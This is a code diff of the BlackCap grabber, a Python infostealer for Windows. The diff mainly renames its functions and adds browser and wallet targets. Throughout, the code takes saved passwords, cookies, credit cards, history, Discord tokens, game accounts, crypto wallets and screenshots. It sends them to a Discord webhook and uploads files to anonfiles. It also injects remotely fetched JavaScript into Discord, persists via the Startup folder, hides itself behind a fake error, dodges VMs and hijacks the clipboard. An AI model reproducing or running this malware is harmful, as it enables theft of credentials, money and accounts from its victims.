@@ -12,13 +12,13 @@ import winreg
 import zipfile
 import httpx
 import psutil
-import win32gui
-import win32con
 import base64
 import requests
 import ctypes
 import time
 import pyperclip
+import win32gui
+import win32con
 
 
 from sqlite3 import connect
@@ -39,11 +39,22 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
 
-Passw = []
+Passw = [];
+
+# `
+#    "yourwebhookurl" = your discord webhook url
+#    "blackcap_inject_url" = my javascript injection (i recommand to not change)
+#    "hide" = you want to hide grabber? ('yes' or 'no')
+#    "dbugkiller" = recommand to let this
+#    "blprggg" = don't touch at this
+#
+# `
+
+
 
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
-    'blackcap_inject_url': "https://raw.githubusercontent.com/Inplex-sys/BlackCap-Grabber-NoDualHook/main/inject.js",
+    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     'hide': '%_hide_script%',
     'ping': '%ping_enabled%',
     'pingtype': '%ping_type%',
@@ -105,15 +116,9 @@ vctm_pc = os.getenv("COMPUTERNAME")
 r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
-BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'
+BlackCap_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'
 reg_req = requests.get(BlackCap_Regex) 
-clear_reg = r"[\w-]{24}" + reg_req.text
-
-
-
-
-
-
+clear_reg = r"[\w-]{24}\." + reg_req.text
 
 
 
@@ -303,12 +308,12 @@ class auto_copy_wallet(Functions):
             self.loop_through()
 
 
-class bl4ckc4p(Functions):
+class bc_initial_func(Functions):
     def __init__(self):
         
         self.dscap1 = "https://discord.com/api/v9/users/@me"
 
-        self.w3bh00k = self.fetch_conf('yourwebhookurl')
+        self.discord_webhook = self.fetch_conf('yourwebhookurl')
 
         self.hide = self.fetch_conf("hide")
 
@@ -338,7 +343,7 @@ class bl4ckc4p(Functions):
 
         self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
-        self.h00ksreg = "api/webhooks"
+        self.regex_webhook_dsc = "api/webhooks"
 
         self.chrmrgx = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
         
@@ -350,7 +355,7 @@ class bl4ckc4p(Functions):
 
         self.tokens = []
 
-        self.ids = []
+        self.bc_id = []
 
         self.sep = os.sep;
 
@@ -364,31 +369,27 @@ class bl4ckc4p(Functions):
 
     
 
-    def hiding(self: str) -> str:
-        if self.hide == "yes":
-            hide = win32gui.GetForegroundWindow()
-            win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
-    def fakeerror(self: str) -> str:
+    def error_remote(self: str) -> str:
         if self.fake_error == "yes":
-            ctypes.windll.user32.MessageBoxW(None, 'Error code: BlackCap_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
+            ctypes.windll.user32.MessageBoxW(None, 'Error code: Windows_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
 
-    def pingonrunning(self: str) -> str:
+    def ping_on_running(self: str) -> str:
         ping1 = {
-            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
             'content': "@everyone"
             }
         ping2 = {
-            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
             'content': "@here"
             }
         if self.pingonrun == "yes":
-            if self.h00ksreg in self.w3bh00k:
+            if self.regex_webhook_dsc in self.discord_webhook:
                 if self.pingtype == "@everyone" or self.pingtype == "everyone":
-                    httpx.post(self.w3bh00k, json=ping1)
+                    httpx.post(self.discord_webhook, json=ping1)
             if self.pingtype == "@here" or self.pingtype == "here":
-                if self.h00ksreg in self.w3bh00k :
-                    httpx.post(self.w3bh00k, json=ping2)
+                if self.regex_webhook_dsc in self.discord_webhook :
+                    httpx.post(self.discord_webhook, json=ping2)
 
 
 
@@ -402,13 +403,20 @@ class bl4ckc4p(Functions):
                 copy2(argv[0], startup_path)
 
 
+                
+    def hidethis(self: str) -> str:
+        if self.hide == "yes":
+            hide = win32gui.GetForegroundWindow()
+            win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
 
-    def _bexit(self):
+
+
+    def bc_exit_this(self):
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
 
-    def trexctrac(func):
+    def extract_try(func):
         '''Decorator to safely catch and ignore exceptions'''
         def wrapper(*args, **kwargs):
             try:
@@ -435,8 +443,9 @@ class bl4ckc4p(Functions):
             'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
             'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
             'iridium': self.appdata + '\\Iridium\\User Data',
-        }
+            'edge': self.appdata + "\\Microsoft\\Edge\\User Data"
 
+        }        
         self.profiles = [
             'Default',
             'Profile 1',
@@ -446,24 +455,24 @@ class bl4ckc4p(Functions):
             'Profile 5',
         ]
 
-        if self.w3bh00k == "" or self.w3bh00k == "\x57EBHOOK_HERE":
-            self._bexit()
+        if self.discord_webhook == "" or self.discord_webhook == "\x57EBHOOK_HERE":
+            self.bc_exit_this()
             
-        self.hiding()
-        self.fakeerror()
+        self.hidethis()
+        self.error_remote()
         self.startupblackcap()
 
-        if self.fetch_conf('dbugkiller') and AntiDebug().inVM is True:
-            self._bexit()
-        await self.bypbd()
-        await self.byptknp()
+        if self.fetch_conf('dbugkiller') and NoDebugg().inVM is True:
+            self.bc_exit_this()
+        await self.bypass_bttdsc()
+        await self.bypass_tokenprtct()
 
-        function_list = [self.scrinsh, self.sysd1, self.grbtkn, self.grbmc, self.grbr0blx]
+        function_list = [self.steal_screen, self.system_informations, self.steal_token, self.grabb_mc, self.grabb_roblox]
 
 
         if self.fetch_conf('kill_discord_process'):
 
-            await self.kllprcsx()
+            await self.kill_process_id()
 
 
 
@@ -474,10 +483,10 @@ class bl4ckc4p(Functions):
 
             self.masterkey = self.gtmk3y(path + '\\Local State')
             self.funcs = [
-                self.grbcook,
-                self.gethistez,
-                self.grbpsw2,
-                self.getccez
+                self.steal_cookies2,
+                self.steal_history2,
+                self.steal_passwords2,
+                self.steal_cc2
             ]
 
             for profile in self.profiles:
@@ -489,7 +498,7 @@ class bl4ckc4p(Functions):
             
         if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
             os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)
-            function_list.extend([self.grbpsw, self.grbcoke, self.grbhis])
+            function_list.extend([self.steal_passwords, self.steal_cookies, self.steal_history])
 
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
@@ -499,14 +508,14 @@ class bl4ckc4p(Functions):
                 t.join()
             except RuntimeError:
                 continue
-        self.ntfytkn()
-        await self._1ject()
-        self.pingonrunning()
-        self.ending()
+        self.natify_matched_tokens()
+        await self._inject_disc()
+        self.ping_on_running()
+        self.finished_bc()
 
     
 
-    async def _1ject(self):
+    async def _inject_disc(self):
         # TO DO: reduce cognetive complexity
         for _dir in os.listdir(self.appdata):
 
@@ -536,8 +545,9 @@ class bl4ckc4p(Functions):
                                         except PermissionError:
                                             pass
 
-                                    if self.h00ksreg in self.w3bh00k:
-                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.w3bh00k)#.replace("%num_core_discord%", inj_path + 'index.js')
+                                    if self.regex_webhook_dsc in self.discord_webhook:
+                                        
+                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.discord_webhook)#.replace("%num_core_discord%", inj_path + 'index.js')
                                     
                                     try:
                                         with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
@@ -548,7 +558,7 @@ class bl4ckc4p(Functions):
                                     if self.fetch_conf('kill_discord_process'):
                                         os.startfile(app + self.sep + _dir + '.exe')
 
-    async def byptknp(self):
+    async def bypass_tokenprtct(self):
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         if not ntpath.exists(tp):
             return
@@ -584,7 +594,7 @@ class bl4ckc4p(Functions):
             with open(config, 'a') as f:
                 f.write("\n\n//KSCH_is_here | https://github.com/KSCHdsc")
 
-    async def kllprcsx(self):
+    async def kill_process_id(self):
         bllist = self.fetch_conf('blprggg')
         for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
             bllist.append(i)
@@ -596,17 +606,17 @@ class bl4ckc4p(Functions):
                     pass
 
 
-    async def bypbd(self):
+    async def bypass_bttdsc(self):
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
         if ntpath.exists(bd):
-            x = self.h00ksreg
+            x = self.regex_webhook_dsc
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
                 content = txt.replace(x, 'KSCHishere')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
-    @trexctrac
+    @extract_try
     def decrypt_val(self, buff, master_key):
         try:
             iv = buff[3:15]
@@ -627,7 +637,7 @@ class bl4ckc4p(Functions):
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
 
-    def grbtkn(self):
+    def steal_token(self):
         paths = {
             'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
@@ -681,9 +691,9 @@ class bl4ckc4p(Functions):
                                     pass
                                 if r.status_code == 200:
                                     uid = r.json()['id']
-                                    if uid not in self.ids:
+                                    if uid not in self.bc_id:
                                         self.tokens.append(token)
-                                        self.ids.append(uid)
+                                        self.bc_id.append(uid)
             else:
                 for filname in os.listdir(path):
                     if filname[-3:] not in ["log", "ldb"]:
@@ -699,9 +709,9 @@ class bl4ckc4p(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
-                                if uid not in self.ids:
+                                if uid not in self.bc_id:
                                     self.tokens.append(token)
-                                    self.ids.append(uid)
+                                    self.bc_id.append(uid)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -719,9 +729,9 @@ class bl4ckc4p(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
-                                if uid not in self.ids:
+                                if uid not in self.bc_id:
                                     self.tokens.append(token)
-                                    self.ids.append(uid)
+                                    self.bc_id.append(uid)
 
 
 
@@ -729,20 +739,20 @@ class bl4ckc4p(Functions):
 
                                     
 
-    def randomdircreator(self, _dir: str or os.PathLike = gettempdir()):
+    def random_dir_create(self, _dir: str or os.PathLike = gettempdir()):
         filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
         path = os.path.join(_dir, filname)
         open(path, "x")
         return path
 
 
-    @trexctrac
-    def grbpsw2(self, name: str, path: str, profile: str):
+    @extract_try
+    def steal_passwords2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\Login Data'
         if not os.path.isfile(path):
             return
 
-        loginvault = self.randomdircreator()
+        loginvault = self.random_dir_create()
         copy2(path, loginvault)
         conn = sqlite3.connect(loginvault)
         cursor = conn.cursor()
@@ -756,12 +766,12 @@ class bl4ckc4p(Functions):
         conn.close()
         os.remove(loginvault)
 
-    @trexctrac
-    def grbcook(self, name: str, path: str, profile: str):
+    @extract_try
+    def steal_cookies2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\Network\\Cookies'
         if not os.path.isfile(path):
             return
-        cookievault = self.randomdircreator()
+        cookievault = self.random_dir_create()
         copy2(path, cookievault)
         conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
@@ -783,8 +793,8 @@ class bl4ckc4p(Functions):
 
 
 
-    @trexctrac
-    def grbpsw(self):
+    @extract_try
+    def steal_passwords(self):
         f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrmmuserdtt):
             if re.match(self.chrmrgx, prof):
@@ -811,8 +821,8 @@ class bl4ckc4p(Functions):
 
 
 
-    @trexctrac
-    def grbcoke(self):
+    @extract_try
+    def steal_cookies(self):
         f = open(ntpath.join(self.dir, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrmmuserdtt):
 
@@ -832,7 +842,7 @@ class bl4ckc4p(Functions):
                     user = r[1]
                     decrypted_cookie = self.dcrpt_val(r[2], self.chrome_key)
                     if host != "":
-                        f.write(f"{host}	TRUE"+"		"+ "/FALSE	2597573456	{user}	{decrypted_cookie}\n")
+                        f.write(f"{host}	TRUE"+"		"+ f"/FALSE	2597573456	{user}	{decrypted_cookie}\n")
                     if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                         self.robloxcookies.append(decrypted_cookie)
 
@@ -841,11 +851,11 @@ class bl4ckc4p(Functions):
                 os.remove(login)
         f.close()
 
-    def gethistez(self, name: str, path: str, profile: str):
+    def steal_history2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\History'
         if not os.path.isfile(path):
             return
-        historyvault = self.randomdircreator()
+        historyvault = self.random_dir_create()
         copy2(path, historyvault)
         conn = sqlite3.connect(historyvault)
         cursor = conn.cursor()
@@ -862,13 +872,13 @@ class bl4ckc4p(Functions):
         conn.close()
         os.remove(historyvault)
 
-    def getccez(self, name: str, path: str, profile: str):
+    def steal_cc2(self, name: str, path: str, profile: str):
         path += '\\' + profile + '\\Web Data'
         if not os.path.isfile(path):
             return
-        cardvault = self.randomdircreator()
-        copy2(path, cardvault)
-        conn = sqlite3.connect(cardvault)
+        credit_card_vault = self.random_dir_create()
+        copy2(path, credit_card_vault)
+        conn = sqlite3.connect(credit_card_vault)
         cursor = conn.cursor()
         with open(os.path.join(self.dir, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
@@ -879,11 +889,11 @@ class bl4ckc4p(Functions):
         f.close()
         cursor.close()
         conn.close()
-        os.remove(cardvault)
+        os.remove(credit_card_vault)
 
 
-    @trexctrac
-    def grbhis(self):
+    @extract_try
+    def steal_history(self):
         f = open(ntpath.join(self.dir, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
 
         def xtractwbhist(db_cursor):
@@ -928,7 +938,7 @@ class bl4ckc4p(Functions):
         f.close()
 
 
-    def ntfytkn(self):
+    def natify_matched_tokens(self):
 
         f = open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')
 
@@ -975,7 +985,7 @@ class bl4ckc4p(Functions):
         f.close()
 
 
-    def grbmc(self):
+    def grabb_mc(self):
         minecraftpath = ntpath.join(self.dir, 'Minecraft')
         os.makedirs(minecraftpath, exist_ok=True)
         mc = ntpath.join(self.roaming, '.minecraft')
@@ -990,7 +1000,7 @@ class bl4ckc4p(Functions):
 
                 
 
-    def grbr0blx(self):
+    def grabb_roblox(self):
         def subproc(path):
             try:
                 return subprocess.check_output(
@@ -1008,7 +1018,7 @@ class bl4ckc4p(Functions):
                 for i in self.robloxcookies:
                     f.write(i + '\n')
 
-    def scrinsh(self):
+    def steal_screen(self):
         image = ImageGrab.grab(
             bbox=None,
             include_layered_windows=False,
@@ -1018,7 +1028,7 @@ class bl4ckc4p(Functions):
         image.save(self.dir + "\\Screenshot.png")
         image.close()
 
-    def sysd1(self):
+    def system_informations(self):
         about = f"""
 {infocom} | {vctm_pc}
 Windows key: {self.w1nk33y}
@@ -1042,7 +1052,7 @@ GoogleMaps: {self.googlemap}
 
 
 
-    def ending(self):
+    def finished_bc(self):
         for i in os.listdir(self.dir):
             if i.endswith('.txt'):
                 path = self.dir + self.sep + i
@@ -1077,44 +1087,44 @@ GoogleMaps: {self.googlemap}
         fileCount = f"{file_count} Files Found: "
 
         embed = {
-            'name': "Blackcap",
-            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'name': "BlackCap",
+            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
             'embeds': [
                 {
                     'author': {
-                        'name': f'Black - Cap v2.3',
+                        'name': f'BlackCap v2.3',
                         'url': 'https://github.com/KSCHdsc',
                         'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                     },
                     'color': 374276,
-                    'description': f'[Black - Cap has Geo Localised this guy]({self.googlemap})',
+                    'description': f'[BlackCap has Geo Localised this guy]({self.googlemap})',
                     'fields': [
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
-                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
-                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
-                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
-                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
+                                IP: {self.ip.replace(" ", " ") if self.ip else "N/A"}
+                                Org: {self.org.replace(" ", " ") if self.org else "N/A"}
+                                City: {self.city.replace(" ", " ") if self.city else "N/A"}
+                                Region: {self.region.replace(" ", " ") if self.region else "N/A"}
+                                Country: {self.country.replace(" ", " ") if self.country else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                Computer Name: {vctm_pc.replace(" ", "᠎ ")}
-                                Windows Key:᠎ {self.w1nk33y.replace(" ", "᠎ ")}
-                                Windows Ver:᠎ {self.w1nv3r.replace(" ", "᠎ ")}
-                                Disk Stockage:᠎ {d1sk}GB
-                                Ram Stockage:᠎ {r4m}GB```
+                                Computer Name: {vctm_pc.replace(" ", " ")}
+                                Windows Key: {self.w1nk33y.replace(" ", " ")}
+                                Windows Ver: {self.w1nv3r.replace(" ", " ")}
+                                Disk Stockage: {d1sk}GB
+                                Ram Stockage: {r4m}GB```
                             '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '**- Tokens:**',
                             'value': f'''```yaml
-                                {tokens if tokens else "tokens not found"}```
+                                {tokens if tokens else "tokens not found"}```
                             '''.replace(' ', ''),
                             'inline': False
                         },
@@ -1137,9 +1147,9 @@ GoogleMaps: {self.googlemap}
 
 
         with open(_zipfile, 'rb') as f:
-            if self.h00ksreg in self.w3bh00k:
-                httpx.post(self.w3bh00k, json=embed)
-                httpx.post(self.w3bh00k, files={'upload_file': f})
+            if self.regex_webhook_dsc in self.discord_webhook:
+                httpx.post(self.discord_webhook, json=embed)
+                httpx.post(self.discord_webhook, files={'upload_file': f})
         os.remove(_zipfile)
 
 
@@ -1148,7 +1158,7 @@ GoogleMaps: {self.googlemap}
 
 
 
-class AntiDebug(Functions):
+class NoDebugg(Functions):
     inVM = False
 
     def __init__(self):
@@ -1161,7 +1171,7 @@ class AntiDebug(Functions):
         self.blpcname = [
             "DESKTOP-CDLNVOQ", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
             "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
-            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
+            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", "DESKTOP-B0T93D6"
         ]
         self.blhwid = [
             "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
@@ -1248,11 +1258,11 @@ class AntiDebug(Functions):
 
 
 
-            
+
 
 
 if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(bl4ckc4p().init())
+    asyncio.run(bc_initial_func().init())
     
 
 
@@ -1357,7 +1367,7 @@ def upload(name, tk=''):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "blackcapedez":
+    if name == "bc_checking":
         data = {
         "content": '',
         "embeds": [
@@ -1379,7 +1389,7 @@ def upload(name, tk=''):
             'color': 374276,
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
+        "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1417,7 +1427,7 @@ def upload(name, tk=''):
             'color': 374276,
             }
         ],
-         "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
+         "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1449,7 +1459,7 @@ def upload(name, tk=''):
             'color': 374276,
             }
         ],
-         "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
+         "avatar_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1535,7 +1545,9 @@ def getCookie(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
-            Cookies.append(f" HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}")
+                    
+            Cookies.append(f"{row[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
+            
     writeforfile(Cookies, 'bc_allcookies')
 
 def checkIfProcessRunning(processName):
@@ -1556,6 +1568,10 @@ def checkIfProcessRunning(processName):
 def ZipThings(path, arg, procc):
     pathC = path
     name = arg
+    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"Exodus_{browser}"
+        pathC = path + arg
 
     if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
@@ -1595,7 +1611,7 @@ def ZipThings(path, arg, procc):
     os.remove(f"{pathC}/{name}.zip")
 
 
-def GatherAll():
+def grabb_GatherAll():
     '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
     browserPaths = [
         [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
@@ -1610,7 +1626,7 @@ def GatherAll():
 
 
 
-    PathsToZip = [
+    Paths_zipped = [
         [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
@@ -1623,20 +1639,20 @@ def GatherAll():
         a.start()
         Threadlist.append(a)
 
-    ThCokk = []
+    thread_bccookies = []
     for patt in browserPaths:
         a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
         a.start()
-        ThCokk.append(a)
+        thread_bccookies.append(a)
 
-    for thread in ThCokk: thread.join()
+    for thread in thread_bccookies: thread.join()
     DETECTED = Trust(Cookies)
     if DETECTED == True: return
 
     for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
 
-    for patt in PathsToZip:
+    for patt in Paths_zipped:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
 
     for thread in Threadlist:
@@ -1648,7 +1664,7 @@ def GatherAll():
         upload(os.getenv("TEMP") + "\\" + file)
 
 
-def uploadToAnonfiles(path):
+def bc_uploadanonfiles(path):
     try:
 
         files = { "file": (path, open(path, mode='rb')) }
@@ -1659,8 +1675,8 @@ def uploadToAnonfiles(path):
     except:
         return False
 
-def blackcapedezFolder(pathF, keywords):
-    global blackcapedezFiles
+def bc_Folder_create(pathF, keywords):
+    global bc_create_files
     maxfilesperdir = 7
     i = 0
     listOfFile = os.listdir(pathF)
@@ -1669,31 +1685,31 @@ def blackcapedezFolder(pathF, keywords):
         if not os.path.isfile(pathF + "/" + file): return
         i += 1
         if i <= maxfilesperdir:
-            url = uploadToAnonfiles(pathF + "/" + file)
+            url = bc_uploadanonfiles(pathF + "/" + file)
             ffound.append([pathF + "/" + file, url])
         else:
             break
-    blackcapedezFiles.append(["folder", pathF + "/", ffound])
+    bc_create_files.append(["folder", pathF + "/", ffound])
 
-blackcapedezFiles = []
-def blackcapedezFile(path, keywords):
-    global blackcapedezFiles
+bc_create_files = []
+def bc_create_file(path, keywords):
+    global bc_create_files
     fifound = []
     listOfFile = os.listdir(path)
     for file in listOfFile:
         for worf in keywords:
             if worf in file.lower():
                 if os.path.isfile(path + "/" + file) and ".txt" in file:
-                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
+                    fifound.append([path + "/" + file, bc_uploadanonfiles(path + "/" + file)])
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
-                    blackcapedezFolder(target, keywords)
+                    bc_Folder_create(target, keywords)
                     break
 
-    blackcapedezFiles.append(["folder", path, fifound])
+    bc_create_files.append(["folder", path, fifound])
 
-def blackcapedez():
+def bc_checking():
     user = temp.split("\AppData")[0]
     path2search = [
         user + "/Desktop",
@@ -1701,13 +1717,7 @@ def blackcapedez():
         user + "/Documents"
     ]
 
-    key_wordsFolder = [
-        "account",
-        "acount",
-        "passw",
-        "secret"
 
-    ]
 
     key_wordsFiles = [
         "passw",
@@ -1720,7 +1730,6 @@ def blackcapedez():
         "acount",
         "paypal",
         "banque",
-        "account",
         "metamask",
         "wallet",
         "crypto",
@@ -1737,8 +1746,8 @@ def blackcapedez():
 
     wikith = []
     for patt in path2search:
-        blackcapedez = threading.Thread(target=blackcapedezFile, args=[patt, key_wordsFiles]);blackcapedez.start()
-        wikith.append(blackcapedez)
+        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()
+        wikith.append(bc_checking)
     return wikith
 
 
@@ -1752,21 +1761,21 @@ keyword = [
 cookiWords = []
 paswWords = []
 
-GatherAll()
+grabb_GatherAll()
 DETECTED = Trust(Cookies)
 
 if not DETECTED:
-    wikith = blackcapedez()
+    wikith = bc_checking()
 
     for thread in wikith: thread.join()
     time.sleep(0.2)
 
-    filetext = "\n"
-    for arg in blackcapedezFiles:
+    filetext = "```diff\n"
+    for arg in bc_create_files:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]
-            filetext +=f"```diff\n"
+            filetext +=f"\n"
             filetext += f"- {foldpath}\n"
 
             for ffil in foldlist:
@@ -1774,8 +1783,10 @@ if not DETECTED:
                 fileanme = a[len(a)-1]
                 b = ffil[1]
                 filetext += f"+ Name: {fileanme}\n+ Link: {b}"
-                filetext += "\n```"
                 filetext += "\n"
-    upload("blackcapedez", filetext)
+    filetext += "\n```"
+
+
+    upload("bc_checking", filetext)
     auto = threading.Thread(target=auto_copy_wallet().run)
     auto.start()
